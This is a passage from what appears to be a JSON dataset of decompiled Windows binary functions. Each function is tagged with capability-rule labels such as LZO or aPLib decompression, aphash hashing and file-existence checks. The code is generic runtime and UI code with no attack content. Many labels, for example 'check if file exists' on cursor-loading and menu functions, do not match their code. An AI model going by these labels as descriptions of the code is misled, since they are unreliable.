        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043be8c(uint param_1, int32_t param_2)\n\n{\n    fcn.00453c38();\n    *(param_2 + 0x24) = *(param_2 + 0x24) & 0xfffffffc;\n    return;\n}\n",
        "token_count": 66
    },
    "00452150": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00452150(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_20h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00418360();\n    fcn.0044f754();\n    iVar1 = *(*(arg_8h + -8) + 8);\n    fcn.004183b0(&var_20h, \n                 ((*(iVar1 + 0x58) - *(iVar1 + 0x50)) + *(*(*(arg_8h + -4) + 0x30) + 0x4c)) - *(*(arg_8h + -4) + 0x4c));\n    fcn.0044f604();\n    return;\n}\n",
        "token_count": 181
    },
    "0046c6c8": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046c6c8(int32_t arg_8h)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    int32_t in_EAX;\n    uint8_t *puVar3;\n    int16_t in_CX;\n    int16_t in_DX;\n    int32_t iVar4;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x16b8) < 0xc) {\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | in_DX + -0x101 << (*(in_EAX + 0x16b8) & 0x1f);\n        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + 5;\n    }\n    else {\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | in_DX - 0x101U << (*(in_EAX + 0x16b8) & 0x1f);\n        iVar4 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar4) = *(in_EAX + 0x16b4);\n        iVar4 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar4) = *(in_EAX + 0x16b4) >> 8;\n        *(in_EAX + 0x16b4) = in_DX - 0x101U >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + -0xb;\n    }\n    if (*(in_EAX + 0x16b8) < 0xc) {\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | in_CX + -1 << (*(in_EAX + 0x16b8) & 0x1f);\n        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + 5;\n    }\n    else {\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | in_CX - 1U << (*(in_EAX + 0x16b8) & 0x1f);\n        iVar4 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar4) = *(in_EAX + 0x16b4);\n        iVar4 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar4) = *(in_EAX + 0x16b4) >> 8;\n        *(in_EAX + 0x16b4) = in_CX - 1U >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + -0xb;\n    }\n    if (*(in_EAX + 0x16b8) < 0xd) {\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | arg_8h + -4 << (*(in_EAX + 0x16b8) & 0x1f);\n        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + 4;\n    }\n    else {\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | arg_8h - 4U << (*(in_EAX + 0x16b8) & 0x1f);\n        iVar4 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar4) = *(in_EAX + 0x16b4);\n        iVar4 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar4) = *(in_EAX + 0x16b4) >> 8;\n        *(in_EAX + 0x16b4) = (arg_8h - 4U & 0xffff) >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + -0xc;\n    }\n    iVar4 = 0;\n    puVar3 = 0x4921d0;\n    if (0 < arg_8h) {\n        do {\n            if (*(in_EAX + 0x16b8) < 0xe) {\n                *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | *(in_EAX + 0xa7a + *puVar3 * 4) << (*(in_EAX + 0x16b8) & 0x1f)\n                ;\n                *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + 3;\n            }\n            else {\n                uVar1 = *(in_EAX + 0xa7a + *puVar3 * 4);\n                *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | uVar1 << (*(in_EAX + 0x16b8) & 0x1f);\n                iVar2 = *(in_EAX + 0x14);\n                *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4);\n                iVar2 = *(in_EAX + 0x14);\n                *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4) >> 8;\n                *(in_EAX + 0x16b4) = uVar1 >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n                *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + -0xd;\n            }\n            iVar4 = iVar4 + 1;\n            puVar3 = puVar3 + 1;\n        } while (iVar4 < arg_8h);\n    }\n    fcn.0046bfdc();\n    fcn.0046bfdc();\n    return;\n}\n",
        "token_count": 1751
    },
    "00404114": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nvoid fcn.00404114(void)\n\n{\n    return;\n}\n",
        "token_count": 15
    },
    "0040a734": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nfloat10 fcn.0040a734(void)\n\n{\n    float10 fVar1;\n    float10 fVar2;\n    uint var_18h;\n    uint var_4h;\n    \n    fVar1 = fcn.0040ba48();\n    fVar2 = fcn.0040b8a4(0);\n    return fVar2 + fVar1;\n}\n",
        "token_count": 83
    },
    "0041f454": {
        "rules": [
            "decompress data using aPLib/db7317f0dd944ab688d24dced6f5a7c2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041f454(uint param_1, int32_t param_2)\n\n{\n    if ((-0x81 < param_2) && (param_2 < 0x80)) {\n        fcn.0041f5d8();\n        fcn.0041f3dc();\n        return;\n    }\n    if ((param_2 < -0x8000) || (0x7fff < param_2)) {\n        fcn.0041f5d8();\n        fcn.0041f3dc();\n    }\n    else {\n        fcn.0041f5d8();\n        fcn.0041f3dc();\n    }\n    return;\n}\n",
        "token_count": 152
    },
    "0043f570": {
        "rules": [
            "decompress data using aPLib/db7317f0dd944ab688d24dced6f5a7c2"
        ],
        "decompiled_code": "\nint32_t fcn.0043f570(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    \n    iVar1 = sub.user32.dll_GetParent();\n    while ((iVar1 != 0 && (uVar2 = sub.user32.dll_GetWindowLongA(iVar1, 0xffffffec),  (uVar2 & 0x80) == 0x80))) {\n        iVar1 = sub.user32.dll_GetParent();\n    }\n    if (iVar1 == 0) {\n        if (*(*0x497c14 + 0x44) != 0) {\n            uVar3 = fcn.00457a28(0xffffffec);\n            uVar2 = sub.user32.dll_GetWindowLongA(uVar3);\n            if ((uVar2 & 0x80) == 0) {\n                iVar1 = fcn.00457a28();\n                return iVar1;\n            }\n        }\n        iVar1 = *(*0x497c14 + 0x30);\n    }\n    return iVar1;\n}\n",
        "token_count": 235
    },
    "00470a78": {
        "rules": [
            "decompress data using aPLib/db7317f0dd944ab688d24dced6f5a7c2"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00470a78(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    uint uVar2;\n    uint *in_ECX;\n    uint *in_EDX;\n    uint *puVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack100;\n    uint uStack96;\n    uchar *puStack92;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint var_20h;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    int32_t var_10h;\n    uint *var_ch;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    var_8h = 0;\n    var_30h = *in_ECX;\n    uStack48 = in_ECX[1];\n    uStack44 = in_ECX[2];\n    uStack40 = in_ECX[3];\n    var_20h = *in_EDX;\n    uStack32 = in_EDX[1];\n    uStack28 = in_EDX[2];\n    puVar3 = in_EDX + 4;\n    uStack24 = in_EDX[3];\n    puStack92 = 0x470aa9;\n    var_4h = in_EAX;\n    fcn.0040716c();\n    uStack96 = 0x470bb3;\n    iStack100 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff9c;\n    var_ch = NULL;\n    var_10h = 0;\n    var_40h = 0x10;\n    var_3ch = 4;\n    var_38h = 0;\n    var_34h = 0x470bc4;\n    puStack92 = &stack0xfffffffc;\n    fcn.00405694(&fcn.00470a78::var_ch, &fcn.00470a78::var_10h, &fcn.00470a78::var_40h, 0);\n    uVar2 = fcn.004063bc();\n    (**(*var_4h + 0x44))(var_4h, 0, &fcn.00470a78::var_20h, &fcn.00470a78::var_30h, uVar2);\n    if (puVar3 < var_ch) {\n        do {\n            if ((*(puVar3 + var_10h) < 0x20) || (0x7f < *(puVar3 + var_10h))) {\n                fcn.00405738();\n            }\n            else {\n                fcn.00405654();\n                fcn.00405738();\n            }\n            puVar3 = puVar3 + 2;\n        } while (puVar3 < var_ch);\n    }\n    iVar1 = var_10h;\n    sub.ole32.dll_CoTaskMemFree_1();\n    fcn.004054c0();\n    *in_FS_OFFSET = iVar1;\n    fcn.00405490(0x470bba);\n    fcn.0040546c();\n    fcn.004070f8();\n    return;\n}\n",
        "token_count": 757
    },
    "004050d8": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.004050d8(void)\n\n{\n    int32_t **ppiVar1;\n    int32_t **in_FS_OFFSET;\n    \n    if (*0x4957cc != NULL) {\n        ppiVar1 = *in_FS_OFFSET;\n        if (*0x4957cc == ppiVar1) {\n            *in_FS_OFFSET = **0x4957cc;\n            return;\n        }\n        for (; ppiVar1 != 0xffffffff; ppiVar1 = *ppiVar1) {\n            if (*ppiVar1 == *0x4957cc) {\n                *ppiVar1 = **0x4957cc;\n                return;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 151
    },
    "004076e8": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.004076e8(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.004076e0();\n    if (iVar1 != 0) {\n        if (*0x4907b0 == -1) {\n            fcn.00405460();\n        }\n        iVar1 = fcn.004076d4();\n        if (iVar1 == 0) {\n            fcn.00405460();\n        }\n        else {\n            sub.kernel32.dll_TlsSetValue(*0x4907b0, iVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 128
    },
    "0040a194": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nulong __cdecl fcn.0040a194(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint lDistanceToMove;\n    uint lpDistanceToMoveHigh;\n    \n    lpDistanceToMoveHigh = arg_ch;\n    iVar1 = sub.kernel32.dll_SetFilePointer_1();\n    if (iVar1 == -1) {\n        iVar2 = sub.kernel32.dll_GetLastError_1();\n        if (iVar2 != 0) {\n            lpDistanceToMoveHigh = 0xffffffff;\n        }\n    }\n    return CONCAT44(lpDistanceToMoveHigh, iVar1);\n}\n",
        "token_count": 138
    },
    "0040a1e4": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.0040a1e4(void)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    \n    uVar1 = fcn.004058fc();\n    uVar2 = sub.kernel32.dll_GetFileAttributesA(uVar1);\n    if ((uVar2 != 0xffffffff) && ((uVar2 & 0x10) == 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 98
    },
    "0040a208": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.0040a208(void)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    \n    uVar1 = fcn.004058fc();\n    uVar2 = sub.kernel32.dll_GetFileAttributesA(uVar1);\n    if ((uVar2 != 0xffffffff) && ((uVar2 & 0x10) != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 96
    },
    "0040a400": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040a400(int32_t param_1, uint32_t param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    *(param_1 + 0x18) = ~param_2 & 0x16;\n    uVar1 = fcn.004058fc(param_1 + 0x20);\n    iVar2 = sub.kernel32.dll_FindFirstFileA_1(uVar1);\n    *(param_1 + 0x1c) = iVar2;\n    if (iVar2 == -1) {\n        iVar2 = sub.kernel32.dll_GetLastError_1();\n    }\n    else {\n        iVar2 = fcn.0040a37c();\n        if (iVar2 != 0) {\n            fcn.0040a474();\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 188
    },
    "0040a474": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.0040a474(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x1c) != -1) {\n        sub.kernel32.dll_FindClose_1(*(in_EAX + 0x1c));\n        *(in_EAX + 0x1c) = 0xffffffff;\n    }\n    return;\n}\n",
        "token_count": 82
    },
    "0040d4bc": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d4bc(uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x40d521;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    for (iVar2 = 1; *(iVar2 * 4 + 0x4958f0) != -1; iVar2 = iVar2 + 1) {\n        if (iVar2 == 7) goto code_r0x0040d50b;\n    }\n    fcn.00405664();\n    uVar1 = fcn.00409e90();\n    *(iVar2 * 4 + 0x4958f0) = uVar1;\ncode_r0x0040d50b:\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x40d528;\n    uStack24 = 0x40d520;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 271
    },
    "004183d8": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.004183d8(void)\n\n{\n    int32_t *in_EAX;\n    \n    if ((*in_EAX == -1) && (in_EAX[1] == -1)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 58
    },
    "0041c5dc": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041c5dc(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00419834();\n    if (iVar1 != -1) {\n        fcn.004196cc();\n    }\n    iVar1 = fcn.00419834();\n    if (iVar1 < 0) {\n        fcn.00419680();\n    }\n    return;\n}\n",
        "token_count": 93
    },
    "0041c970": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t fcn.0041c970(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00416680();\n    if (iVar1 == -1) {\n        fcn.0041c938();\n    }\n    return iVar1;\n}\n",
        "token_count": 60
    },
    "00435d54": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.00435d54(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00435d20();\n    if (iVar1 == -1) {\n        fcn.00432eac();\n    }\n    fcn.00435bfc();\n    return;\n}\n",
        "token_count": 66
    },
    "00437810": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00437810(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint32_t in_EDX;\n    int32_t iVar3;\n    \n    iVar3 = 0;\n    if ((in_EDX & 0x10) == 0) {\n        iVar1 = sub.user32.dll_GetMenuItemID();\n        if (iVar1 != -1) {\n            iVar3 = fcn.00436e3c();\n        }\n    }\n    else {\n        sub.user32.dll_GetSubMenu();\n        iVar3 = fcn.00436e3c();\n    }\n    if (iVar3 == 0) {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = fcn.0043b0f4();\n    }\n    return uVar2;\n}\n",
        "token_count": 186
    },
    "0044332c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.0044332c(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    \n    uVar1 = sub.user32.dll_LoadCursorA(0, 0x7f00);\n    *(in_EAX + 0x60) = uVar1;\n    iVar2 = -0x16;\n    do {\n        sub.user32.dll_LoadCursorA();\n        fcn.004433e8();\n        iVar2 = iVar2 + 1;\n    } while (iVar2 != -1);\n    return;\n}\n",
        "token_count": 126
    },
    "00443698": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00443698(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint *puVar2;\n    \n    uVar1 = 0;\n    if (param_2 != -1) {\n        for (puVar2 = *(in_EAX + 0x5c); (puVar2 != NULL && (param_2 != puVar2[1])); puVar2 = *puVar2) {\n        }\n        if (puVar2 == NULL) {\n            uVar1 = *(in_EAX + 0x60);\n        }\n        else {\n            uVar1 = puVar2[2];\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 164
    },
    "0044810c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044810c(int32_t param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uchar *puStack92;\n    uint uStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint var_28h;\n    uint var_18h;\n    uint var_14h;\n    int32_t *var_10h;\n    int32_t *var_ch;\n    uint himl;\n    uint var_4h;\n    \n    puStack68 = 0x448137;\n    himl = param_2;\n    fcn.00418388(&fcn.0044810c::var_28h, *(in_EAX + 0x30));\n    puStack68 = 0x44813f;\n    fcn.00448da8();\n    uStack72 = 0x4482a5;\n    uStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    puStack80 = 0x448159;\n    puStack68 = &stack0xfffffffc;\n    var_ch = fcn.00428b88();\n    uStack84 = 0x448288;\n    uStack88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa8;\n    puStack92 = 0x448178;\n    puStack80 = &stack0xfffffffc;\n    (**(*var_ch + 0x34))();\n    puStack92 = 0x448186;\n    (**(*var_ch + 0x40))();\n    puStack92 = 0x448192;\n    var_10h = fcn.00428b88();\n    uStack96 = 0x44826b;\n    uStack100 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff9c;\n    puStack92 = &stack0xfffffffc;\n    fcn.00429f8c();\n    (**(*var_10h + 0x34))();\n    (**(*var_10h + 0x40))();\n    uStack104 = himl;\n    iVar1 = sub.comctl32.dll_ImageList_GetImageCount();\n    if (-1 < iVar1 + -1) {\n        iVar3 = 0;\n        do {\n            if ((param_1 == -1) || (iVar3 == param_1)) {\n                var_14h = fcn.0042915c();\n                fcn.00424bd0();\n                uVar2 = fcn.00424ec0(0, 0, 0);\n                sub.comctl32.dll_ImageList_Draw(himl, iVar3, uVar2);\n                var_18h = fcn.0042915c();\n                fcn.00424bd0();\n                fcn.00424ec0(0, 0, 0x10);\n                uStack104 = himl;\n                sub.comctl32.dll_ImageList_Draw();\n                fcn.00447cdc();\n            }\n            iVar3 = iVar3 + 1;\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    *in_FS_OFFSET = uStack104;\n    uStack96 = 0x448272;\n    uStack100 = 0x44826a;\n    fcn.00404640();\n    return;\n}\n",
        "token_count": 790
    },
    "0044f554": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044f554(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    \n    cVar1 = fcn.004047cc();\n    if (cVar1 == '\\0') {\n        fcn.0045011c();\n    }\n    if (param_2 == in_EAX[0xc]) {\n        fcn.0044f604();\n    }\n    else {\n        fcn.00451024();\n    }\n    if ((param_2 == 0) || (param_2 == -1)) {\n        (**(*in_EAX + 0x6c))();\n    }\n    return;\n}\n",
        "token_count": 153
    },
    "0045fbf8": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0045fbf8(void)\n\n{\n    uint *in_EAX;\n    uint uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack828;\n    uint uStack824;\n    uchar *puStack820;\n    uint var_320h;\n    uint var_31ch;\n    uint var_318h;\n    uint var_314h;\n    uint var_310h;\n    uint lpReturnedString;\n    uint var_109h;\n    uint var_4h;\n    \n    puStack820 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack824 = 0x45fda7;\n    uStack828 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffcc4;\n    iVar3 = 0xf;\n    do {\n        fcn.00403ea8();\n        fcn.004056d0();\n        fcn.00405784();\n        uVar1 = fcn.004058fc();\n        uVar1 = fcn.004058fc(0x45fdd0, 0x45fdcc, &fcn.0045fbf8::var_109h, 0x400, uVar1);\n        sub.kernel32.dll_GetPrivateProfileStringA(uVar1);\n        uVar2 = fcn.004058fc();\n        sub.kernel32.dll_GetPrivateProfileStringA\n                  (uVar1, 0x45fdd8, 0x45fdcc, &fcn.0045fbf8::lpReturnedString, 0x400, uVar2);\n        if ((var_109h != '0') && (lpReturnedString != '0')) {\n            fcn.004056dc(*in_EAX);\n            fcn.004056dc(0);\n            fcn.0045fa44();\n            fcn.00405800(0x45fdf8, 0x45fdec, 0);\n        }\n        if ((var_109h != '0') && (lpReturnedString == '0')) {\n            fcn.004056dc(0x45fe04);\n            fcn.00405800(0x45fe28, 0x45fe14, 0);\n        }\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != -1);\n    *in_FS_OFFSET = uStack828;\n    puStack820 = 0x45fdae;\n    uStack824 = 0x45fd9e;\n    fcn.00405490();\n    uStack824 = 0x45fda6;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 593
    },
    "00464794": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint64_t fcn.00464794(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t *in_FS_OFFSET;\n    uchar auStack356 [8];\n    uint uStack348;\n    uint uStack344;\n    uint *puStack340;\n    uint var_148h;\n    uint var_12ch;\n    uint var_128h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack340 = &fcn.00464794::var_148h;\n    uStack344 = 0x4647ae;\n    uStack344 = fcn.004058fc();\n    uStack348 = 0x4647b4;\n    iVar2 = sub.kernel32.dll_FindFirstFileA_1();\n    if (iVar2 == -1) {\n        return 0;\n    }\n    uVar1 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffe9c;\n    *in_FS_OFFSET = uVar1;\n    return uVar1 << 0x20;\n}\n",
        "token_count": 232
    },
    "004664a8": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_3ch\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_44h\n// WARNING: Variable defined which should be unmapped: var_40h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid fcn.004664a8(void)\n\n{\n    uint in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint unaff_EBX;\n    int32_t unaff_ESI;\n    int32_t *in_FS_OFFSET;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    int32_t var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    int32_t var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    int32_t var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    int32_t var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t *var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_18h = &stack0xfffffffc;\n    iVar2 = 0x16;\n    do {\n        var_4h = 0;\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    var_1ch = 0x466a83;\n    var_20h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.004664a8::var_20h;\n    var_14h = in_EAX;\n    var_10h = unaff_ESI;\n    var_ch = unaff_EBX;\n    fcn.00420f38();\n    var_18h = fcn.00404610();\n    piVar1 = fcn.00404610();\n    fcn.00421014();\n    fcn.00421158();\n    fcn.00421714();\n    iVar2 = (**(*var_18h + 0x14))();\n    if (-1 < iVar2 + -1) {\n        var_1ch = 0;\n        do {\n            iVar2 = var_38h;\n            (**(*var_18h + 0xc))(var_4h);\n            (**(*var_18h + 0xc))(0x466ad4, var_34h);\n            fcn.004218dc();\n            fcn.0040a604();\n            var_34h = 0x466ad4;\n            var_38h = 0x46658b;\n            (**(*var_18h + 0xc))();\n            var_8h = 0x466598;\n            fcn.004218dc();\n            var_8h = var_44h;\n            var_ch = 0x466ad4;\n            var_10h = 0x466ae0;\n            var_14h = 0x466a9c;\n            var_18h = 0x466ad4;\n            var_1ch = 0x466af0;\n            var_20h = 0x466afc;\n            fcn.00405800();\n            var_1ch = var_1ch + 1;\n        } while (iVar2 != 1);\n    }\n    fcn.00420fe4();\n    (**(*var_18h + 0x44))();\n    fcn.00421014();\n    fcn.00421158();\n    fcn.00421714();\n    iVar2 = (**(*var_18h + 0x14))();\n    if (-1 < iVar2 + -1) {\n        var_1ch = 0;\n        do {\n            (**(*var_18h + 0xc))(var_8h);\n            (**(*var_18h + 0xc))(0x466ad4, var_4ch);\n            fcn.004218dc();\n            fcn.0040a604();\n            (**(*var_18h + 0xc))(0x466ad4);\n            var_8h = 0x466683;\n            fcn.004218dc();\n            var_8h = 